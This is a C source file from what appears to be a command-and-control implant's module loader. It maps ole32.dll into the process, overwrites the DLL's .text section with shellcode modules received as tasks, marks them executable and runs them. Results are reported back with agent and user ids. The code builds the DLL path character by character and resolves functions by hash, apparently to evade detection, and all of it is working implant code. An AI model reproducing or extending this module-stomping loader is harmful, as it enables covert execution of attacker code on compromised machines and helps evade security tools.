#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/comms/comms.h"
#include "../../includes/loader/loader.h"
#include "../../includes/parser/parser.h"




/*
INPUT
	[CODE] -> TASK_MODULE
	[]

OUTPUT
	[MSG_TYPE] 0xaf
	[output type]
	[user id]
	[agent id]
	per output type
	e.g for ls
	[file len] 4 bytes
	[file str] N bytes
	[entry type] 4 bytes
	[size] 4 bytes
	[end sig]
*/
void ModuleWrite4(PVOID ctx, DWORD val) {
	ParserWrite4((ParserWrite *)ctx, val);
}

void ModuleWrite8(PVOID ctx, ULONGLONG val) {
	ParserWrite8((ParserWrite *)ctx, val);
}

void ModuleWriteStr(PVOID ctx, PCHAR str, DWORD len) {
	ParserWriteRaw((ParserWrite *)ctx, (PBYTE)str, len);
}

HMODULE ModuleGetModule(DWORD hash) {
	return GetModule(hash);
}

FARPROC ModuleGetProc(HMODULE mod, DWORD hash) {
	return GetProc(mod, hash);
}

HMODULE ModuleLoadLibraryA(PCHAR name) {
	return ldr->win32->LoadLibraryA(name);
}

BOOL ModuleFreeLibrary(HMODULE mod) {
	return ldr->win32->FreeLibrary(mod);
}


PVOID ModuleAllocate(DWORD Size) {
	PVOID Addr = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, Size);
	return Addr;
}

void ModuleFreeMemory(HLOCAL mem) {
	ldr->win32->LocalFree(mem);
}


PVOID LdrGetText(PVOID Base, PSIZE_T textSize) {
	PIMAGE_SECTION_HEADER sec = SECTION_HEADER(Base);
	WORD numSections = FILE_HEADER(Base)->NumberOfSections;

	for (WORD i = 0; i < numSections; i++) {
		if (LdrMemcmp(sec[i].Name, ".text", 5) == 0) {
			*textSize = sec[i].Misc.VirtualSize;
			return RVA2VA(PVOID, Base, sec[i].VirtualAddress);
		}
	}
	return NULL;
}

BOOL LdrMapInOle() {
	HANDLE hFile = NULL;
	HANDLE hSection = NULL;
	PVOID base = NULL;
	SIZE_T vSize = 0;
	CHAR ole[30];
	ole[0]  = 'C';  ole[1]  = ':';  ole[2]  = '\\';
	ole[3]  = 'W';  ole[4]  = 'i';  ole[5]  = 'n';
	ole[6]  = 'd';  ole[7]  = 'o';  ole[8]  = 'w';
	ole[9]  = 's';  ole[10] = '\\'; ole[11] = 'S';
	ole[12] = 'y';  ole[13] = 's';  ole[14] = 't';
	ole[15] = 'e';  ole[16] = 'm';  ole[17] = '3';
	ole[18] = '2';  ole[19] = '\\'; ole[20] = 'o';
	ole[21] = 'l';  ole[22] = 'e';  ole[23] = '3';
	ole[24] = '2';  ole[25] = '.';  ole[26] = 'd';
	ole[27] = 'l';  ole[28] = 'l';  ole[29] = '\0';

	hFile = ldr->win32->CreateFileA(ole, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if(!NT_SUCCESS(ldr->win32->NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile))) {
		ldr->win32->CloseHandle(hFile);
		return FALSE;
	}

	if(!NT_SUCCESS(ldr->win32->NtMapViewOfSection(hSection, CurrentProcess(), &base, 0, 0, NULL, &vSize, 1, 0, PAGE_READONLY))) {
		ldr->win32->CloseHandle(hFile);
		ldr->win32->CloseHandle(hSection);
		return FALSE;
	}


	SIZE_T txtSize = 0;
	PVOID textAddr = LdrGetText(base, &txtSize);
	if(!textAddr) {
		ldr->win32->CloseHandle(hFile);
		ldr->win32->CloseHandle(hSection);
		return FALSE;
	}

	ldr->modules->TextSection = textAddr;
	ldr->modules->TextSize = txtSize;
	ldr->modules->oldPerms = PAGE_READONLY;
	ldr->modules->ArenaCursor = (PBYTE)textAddr;

	return TRUE;


}


#define LDR_PAGE_ALIGN(x) (((SIZE_T)(x) + 0xFFF) & ~(SIZE_T)0xFFF)


static DWORD LdrHashBytes(PBYTE data, SIZE_T len) {
	DWORD h = 5381;
	for (SIZE_T i = 0; i < len; i++)
		h = (h * 33) + (DWORD)data[i];
	return h;
}


static PVOID LdrArenaReserve(SIZE_T size) {
	SIZE_T need = LDR_PAGE_ALIGN(size);
	PBYTE  cur  = ldr->modules->ArenaCursor;
	PBYTE  end  = (PBYTE)ldr->modules->TextSection + ldr->modules->TextSize;

	if (!cur || need == 0 || cur + need > end)
		return NULL;

	ldr->modules->ArenaCursor = cur + need;
	return cur;
}

static pLoadedModule LdrModuleFind(DWORD hash, PBYTE code, DWORD size) {
	for (DWORD i = 0; i < MAX_LOADED_MODULES; i++) {
		pLoadedModule m = &ldr->modules->Loaded[i];
		if (m->Hash == hash && m->Size == size && LdrMemcmp(m->Entry, code, size) == 0)
			return m;
	}
	return NULL;
}

static void LdrModuleInsert(DWORD hash, PVOID entry, DWORD size) {
	if (hash == 0)
		hash = 1;
	for (DWORD i = 0; i < MAX_LOADED_MODULES; i++) {
		pLoadedModule m = &ldr->modules->Loaded[i];
		if (m->Hash == 0) {
			m->Hash  = hash;
			m->Entry = entry;
			m->Size  = size;
			return;
		}
	}
	DBGA("[!] Module cache full, running uncached\n");
}


static void LdrBuildModuleApi(pModule api) {
	api->size               = sizeof(Module);
	api->Version            = 1;
	api->ModuleWrite4       = ModuleWrite4;
	api->ModuleWrite8       = ModuleWrite8;
	api->ModuleWriteStr     = ModuleWriteStr;
	api->ModuleGetModule    = ModuleGetModule;
	api->ModuleGetProc      = ModuleGetProc;
	api->ModuleLoadLibraryA = ModuleLoadLibraryA;
	api->ModuleFreeLibrary  = ModuleFreeLibrary;
	api->ModuleAllocate     = ModuleAllocate;
	api->ModuleFree         = ModuleFreeMemory;
}


BOOL LdrRunModule(LdrTask info, ParserWrite *p) {
	if (!ldr->modules->TextSection) {
		DBGA("[+] Mapping Module into memory\n");
		if (!LdrMapInOle())
			return FALSE;
	}

	DWORD hash = LdrHashBytes(info.Data, (SIZE_T)info.DataSize);
	pLoadedModule cached = LdrModuleFind(hash, info.Data, info.DataSize);
	PVOID entry = NULL;

	if (cached) {
		DBGA("[*] Module cache hit\n");
		entry = cached->Entry;
	} else {
		DBGA("[*] Module cache miss, loading\n");

		PVOID dst = LdrArenaReserve((SIZE_T)info.DataSize);
		if (!dst) {
			DBGA("[!] Module arena exhausted\n");
			return FALSE;
		}

		SIZE_T sz  = LDR_PAGE_ALIGN((SIZE_T)info.DataSize);
		ULONG  old = 0;

		if (!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &dst, &sz, PAGE_READWRITE, &old))) {
			DBGA("[*] NtProtect Failed\n");
			return FALSE;
		}

		LdrMemcpy(dst, info.Data, (SIZE_T)info.DataSize);
		if (sz > (SIZE_T)info.DataSize)
			LdrMemset((PBYTE)dst + info.DataSize, 0, sz - (SIZE_T)info.DataSize);

		if (!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &dst, &sz, PAGE_EXECUTE_READ, &old))) {
			DBGA("[*] NtProtect Failed\n");
			return FALSE;
		}
		ldr->win32->NtFlushInstructionCache(CurrentProcess(), dst, (SIZE_T)info.DataSize);

		entry = dst;
		LdrModuleInsert(hash, entry, info.DataSize);
	}

	
	if (info.Data)
		ldr->win32->LocalFree(info.Data);

	Module api;
	LdrBuildModuleApi(&api);

	DBGA("[*] Running Module\n");
	if (!((pModuleEntry)entry)(&api, (PVOID)p, (PBYTE)info.args, 0)) {
		DBGA("[!] Module returned failure\n");
	}
	DBGA("[*] Module ran succesfully");

	if(info.args) {
		ldr->win32->LocalFree(info.args);
	}

	return TRUE;
}
